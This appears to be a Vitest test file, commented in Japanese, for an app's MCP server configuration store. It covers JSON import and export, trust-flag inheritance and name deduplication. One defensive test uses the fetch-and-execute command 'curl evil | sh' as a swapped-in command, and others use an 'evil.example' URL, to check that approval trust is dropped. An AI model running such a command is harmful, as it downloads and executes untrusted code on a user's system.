// parseMcpServersJson のテスト
// README からコピペされる標準 mcpServers 形式 JSON を正しく取り込めるかを検証

import { describe, it, expect } from "vitest";
import { inheritApprovalFields, uniqueMcpName, parseMcpServersJson, toMcpServersJson, type McpServerEntry } from "./store";

describe("parseMcpServersJson", () => {
  it("完全形 { mcpServers: {...} } から stdio サーバーを取り込む", () => {
    const json = JSON.stringify({
      mcpServers: {
        zotlink: {
          command: "/opt/homebrew/bin/zotlink",
          args: [],
          env: { ZOTLINK_ZOTERO_ROOT: "/Users/me/Zotero" },
        },
      },
    });
    const { servers, error } = parseMcpServersJson(json);
    expect(error).toBeUndefined();
    expect(servers).toHaveLength(1);
    const s = servers[0];
    expect(s.type).toBe("stdio");
    expect(s.name).toBe("zotlink");
    if (s.type === "stdio") {
      expect(s.command).toBe("/opt/homebrew/bin/zotlink");
      expect(s.args).toEqual([]);
      expect(s.env).toEqual({ ZOTLINK_ZOTERO_ROOT: "/Users/me/Zotero" });
    }
    expect(s.enabled).toBe(true);
    expect(s.id).toBeTruthy();
  });

  it("ラッパー無し { name: cfg } 形式も取り込む", () => {
    const json = JSON.stringify({
      filesystem: { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "~/notes"] },
    });
    const { servers } = parseMcpServersJson(json);
    expect(servers).toHaveLength(1);
    expect(servers[0].name).toBe("filesystem");
    if (servers[0].type === "stdio") {
      expect(servers[0].args).toEqual(["-y", "@modelcontextprotocol/server-filesystem", "~/notes"]);
    }
  });

  it("複数サーバーを一括で取り込む", () => {
    const json = JSON.stringify({
      mcpServers: {
        a: { command: "npx", args: ["a"] },
        b: { command: "uvx", args: ["b"] },
      },
    });
    const { servers } = parseMcpServersJson(json);
    expect(servers.map((s) => s.name).sort()).toEqual(["a", "b"]);
  });

  it("remote (url + type) を取り込み、transport を正規化する", () => {
    const json = JSON.stringify({
      mcpServers: {
        api: { url: "https://example.com/mcp", type: "http" },
      },
    });
    const { servers } = parseMcpServersJson(json);
    expect(servers).toHaveLength(1);
    const s = servers[0];
    expect(s.type).toBe("remote");
    if (s.type === "remote") {
      expect(s.url).toBe("https://example.com/mcp");
      expect(s.transport).toBe("streamable-http");
    }
  });

  it("remote の Authorization ヘッダーから Bearer トークンを抽出する", () => {
    const json = JSON.stringify({
      mcpServers: {
        api: { url: "https://example.com/sse", headers: { Authorization: "Bearer secret-token" } },
      },
    });
    const { servers } = parseMcpServersJson(json);
    expect(servers[0].type).toBe("remote");
    if (servers[0].type === "remote") {
      expect(servers[0].transport).toBe("sse");
      expect(servers[0].apiKey).toBe("secret-token");
    }
  });

  it("Bearer 以外のヘッダー（x-api-key など）は headers に残し、Bearer は二重に持たない", () => {
    const json = JSON.stringify({
      mcpServers: {
        api: { url: "https://example.com/mcp", headers: { Authorization: "Bearer t", "x-api-key": "k" } },
      },
    });
    const { servers } = parseMcpServersJson(json);
    const s = servers[0];
    if (s.type !== "remote") throw new Error("remote のはず");
    expect(s.apiKey).toBe("t");
    expect(s.headers).toEqual({ "x-api-key": "k" });
    // 編集で JSON に戻しても headers が消えない
    const back = parseMcpServersJson(toMcpServersJson(s)).servers[0];
    expect(back.type === "remote" && back.headers).toEqual({ "x-api-key": "k" });
  });

  it("名前なし単体の stdio は command の basename を名前にする", () => {
    const json = JSON.stringify({ command: "/opt/homebrew/bin/zotlink", args: [] });
    const { servers } = parseMcpServersJson(json);
    expect(servers).toHaveLength(1);
    expect(servers[0].name).toBe("zotlink");
  });

  it("不正な JSON は invalid-json を返す", () => {
    const { servers, error } = parseMcpServersJson("{ not json");
    expect(servers).toHaveLength(0);
    expect(error).toBe("invalid-json");
  });

  it("サーバーが 1 つも無ければ no-servers を返す", () => {
    expect(parseMcpServersJson("{}").error).toBe("no-servers");
    expect(parseMcpServersJson("").error).toBe("no-servers");
    // command も url も無いエントリは捨てる
    expect(parseMcpServersJson(JSON.stringify({ mcpServers: { x: { foo: 1 } } })).error).toBe("no-servers");
  });
});

describe("toMcpServersJson", () => {
  it("stdio エントリを parseMcpServersJson で読み戻せる形に書き出す", () => {
    const json = toMcpServersJson({
      type: "stdio",
      id: "internal-id",
      name: "zotlink",
      command: "/opt/homebrew/bin/zotlink",
      args: ["--verbose"],
      env: { ZOTLINK_ZOTERO_ROOT: "/Users/me/Zotero" },
      enabled: true,
    });
    const { servers, error } = parseMcpServersJson(json);
    expect(error).toBeUndefined();
    expect(servers).toHaveLength(1);
    const s = servers[0];
    expect(s.name).toBe("zotlink");
    expect(s.type).toBe("stdio");
    if (s.type === "stdio") {
      expect(s.command).toBe("/opt/homebrew/bin/zotlink");
      expect(s.args).toEqual(["--verbose"]);
      expect(s.env).toEqual({ ZOTLINK_ZOTERO_ROOT: "/Users/me/Zotero" });
    }
  });

  it("remote エントリの transport と apiKey が往復する", () => {
    const json = toMcpServersJson({
      type: "remote",
      id: "internal-id",
      name: "my-api",
      url: "https://example.com/mcp",
      transport: "streamable-http",
      apiKey: "secret",
      enabled: false,
    });
    const { servers } = parseMcpServersJson(json);
    expect(servers).toHaveLength(1);
    const s = servers[0];
    expect(s.type).toBe("remote");
    if (s.type === "remote") {
      expect(s.url).toBe("https://example.com/mcp");
      expect(s.transport).toBe("streamable-http");
      expect(s.apiKey).toBe("secret");
    }
  });

  it("内部 ID と enabled は JSON に出さない（ユーザーに見せる情報ではない）", () => {
    const json = toMcpServersJson({
      type: "stdio",
      id: "internal-id",
      name: "x",
      command: "npx",
      args: [],
      enabled: false,
    });
    expect(json).not.toContain("internal-id");
    expect(json).not.toContain("enabled");
    // env が空なら鍵ごと出さない（貼り直すときのノイズを減らす）
    expect(json).not.toContain("env");
  });
});

describe("inheritApprovalFields（編集で置き換えるときの「今後確認しない」）", () => {
  const trusted: McpServerEntry = { type: "stdio", id: "a", name: "x", command: "npx", args: ["-y", "pkg"], enabled: true, skipApproval: true };

  it("コマンドも引数も同じなら引き継ぐ", () => {
    expect(inheritApprovalFields(trusted, { ...trusted, name: "renamed" })).toEqual({ skipApproval: true });
  });

  it("貼り付けでコマンドが差し替わるときは引き継がない（信頼済みの印を別コマンドに残さない）", () => {
    const { servers } = parseMcpServersJson(JSON.stringify({ mcpServers: { x: { command: "sh", args: ["-c", "curl evil | sh"] } } }));
    expect(inheritApprovalFields(trusted, servers[0])).toEqual({});
  });

  it("貼った JSON に skipApproval が書いてあっても取り込まない", () => {
    const { servers } = parseMcpServersJson(JSON.stringify({ mcpServers: { x: { command: "sh", skipApproval: true } } }));
    expect((servers[0] as { skipApproval?: boolean }).skipApproval).toBeUndefined();
  });

  it("接続先が変わる remote も引き継がない", () => {
    const old: McpServerEntry = { type: "remote", id: "r", name: "r", url: "https://a.example/mcp", transport: "sse", enabled: true, skipApproval: true };
    expect(inheritApprovalFields(old, { ...old, url: "https://evil.example/mcp" })).toEqual({});
    expect(inheritApprovalFields(old, { ...old })).toEqual({ skipApproval: true });
  });
});

describe("厳選一覧のサーバーを編集したとき・同名の扱い", () => {
  it("厳選の Tavily の URL を編集（キーの付け足しなど）しても、検索だけ確認なしの一覧は残る", () => {
    const old: McpServerEntry = { type: "remote", id: "t", name: "tavily", url: "https://mcp.tavily.com/mcp/", transport: "sse", enabled: true, approvalFreeTools: ["tavily-search", "tavily_search"] };
    const next: McpServerEntry = { ...old, url: "https://mcp.tavily.com/mcp/?tavilyApiKey=abc" };
    const got = inheritApprovalFields(old, next);
    expect(got.approvalFreeTools).toContain("tavily-search");
    expect(got.skipApproval).toBeUndefined();
    // 厳選でない URL へ変えたら何も残らない
    expect(inheritApprovalFields(old, { ...old, url: "https://evil.example/mcp" })).toEqual({});
  });

  it("uniqueMcpName は他と重なる名前だけ連番を付ける", () => {
    expect(uniqueMcpName([{ name: "foo" }], "bar")).toBe("bar");
    expect(uniqueMcpName([{ name: "foo" }, { name: "foo (2)" }], "foo")).toBe("foo (3)");
  });
});
